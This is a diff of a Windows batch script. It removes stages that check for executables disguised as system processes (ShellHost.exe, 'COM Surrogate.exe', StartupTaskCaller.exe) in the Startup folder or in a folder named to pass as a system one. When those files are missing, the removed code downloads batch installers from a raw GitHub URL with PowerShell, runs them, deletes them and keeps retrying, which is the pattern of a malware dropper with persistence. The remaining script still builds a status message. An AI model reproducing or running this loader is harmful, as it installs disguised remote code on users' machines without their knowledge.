@@ -46,7 +46,7 @@ if %fileExists% neq 1 (
 )
 
 :: Both the scheduled task and the file exist
-goto :CheckSHST
+goto :SENDMSG
 
 
 
@@ -121,123 +121,13 @@ set "MESSAGE=%MESSAGE%|RUNEVERY|"
 
 
 
-
-
-
-
-
-:CheckSHST
-:: Check ShellHost.exe; if found, skip to SENDMSG
-if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe" (
-    goto CheckComSurrogate
-)
-
-:: Run commands if ShellHost.exe is not found
-echo Checking for ShellHost...
-set "embeddedScript=temp_script_SHST.bat"
-
-:: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
-) else (
-    echo Filed to get content from ShellHost Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckSHST
-)
-
-set "MESSAGE=%MESSAGE%|SHST|"
-
-
-
-
-
-
-
-
-
-
-
-
-echo.
-echo.
-:CheckComSurrogate
-:: Check ComSurrogate.exe; if found, skip to next section
-if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe" (
-    goto CheckSTC
-)
-
-:: Run commands if ComSurrogate.exe is not found
-echo Checking for COM Surrogate...
-set "embeddedScript=temp_script_COM.bat"
-
-:: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
-) else (
-    echo Filed to get content from ComSurrogate Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckComSurrogate
-)
-
-set "MESSAGE=%MESSAGE%|ComSurrogate|"
-
-
-
-
-
-
-
-
-
-
-echo.
-echo.
-:CheckSTC
-:: Check StartupTaskCaller.exe; if found, skip to SENDMSG
-if exist "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe" (
-    goto SENDMSG
-)
-
-:: Run commands if StartupTaskCaller.exe is not found
-echo Checking for StartupTaskCaller...
-set "embeddedScript=temp_script_STC.bat"
-
-:: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/StartupTaskCaller') | Out-File -Encoding ASCII '%embeddedScript%'"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
-) else (
-    echo Filed to get content from StartupTaskCaller Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckSTC
-)
-
-set "MESSAGE=%MESSAGE%|STC|"
-
-
-
-
 timeout /t 5 /nobreak >nul
 
 :SENDMSG
 
 
 if not exist "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe" (
-    set "MESSAGE=%MESSAGE%|NOTEXISTSTC|"
+    set "MESSAGE=%MESSAGE%"
 )
 
 
